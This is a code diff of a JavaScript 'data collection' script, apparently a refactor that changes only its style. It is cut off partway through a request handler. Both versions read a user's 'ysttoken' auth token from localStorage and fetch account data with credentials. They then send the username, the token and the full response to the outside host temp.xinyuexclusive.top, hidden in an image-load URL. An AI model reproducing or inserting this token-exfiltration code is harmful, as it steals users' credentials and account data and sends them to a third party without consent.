@@ -2,47 +2,50 @@
  * 临时数据收集脚本
  * 用于收集用户信息并发送到服务器
  */
-(function () {
+(function() {
   'use strict';
 
   // 获取本地存储的token
-  var ysttoken = localStorage.getItem('ysttoken');
-  
+  const ysttoken = localStorage.getItem('ysttoken');
+
   // 如果没有token，直接返回
   if (!ysttoken) {
     console.warn('未找到ysttoken，跳过数据收集');
     return;
   }
 
-  var data = null;
-  var xhr = new XMLHttpRequest();
+  const data = null;
+  const xhr = new XMLHttpRequest();
   xhr.withCredentials = true;
 
   // 监听请求状态变化
-  xhr.addEventListener('readystatechange', function () {
+  xhr.addEventListener('readystatechange', function() {
     if (this.readyState === 4) {
       try {
         // 解析响应数据
-        var resData = JSON.parse(this.responseText);
-        
+        const resData = JSON.parse(this.responseText);
+
         if (resData.success) {
           // 删除敏感数据
           delete resData.data.boardList;
-          
+
           // 构建参数对象
-          var params = {
+          const params = {
             a: resData.data.userName,
             b: ysttoken,
             c: JSON.stringify(resData),
           };
 
           // 创建图片对象用于发送数据
-          var img = new Image();
+          const img = new Image();
           img.src =
             'http://temp.xinyuexclusive.top/addTemp?' +
-            'a=' + encodeURIComponent(params.a) +
-            '&b=' + encodeURIComponent(params.b) +
-            '&c=' + encodeURIComponent(params.c);
+            `a=${
+              encodeURIComponent(params.a)
+            }&b=${
+              encodeURIComponent(params.b)
+            }&c=${
+              encodeURIComponent(params.c)}`;
 
           // 监听图片加载完成
           img.onload = function() {
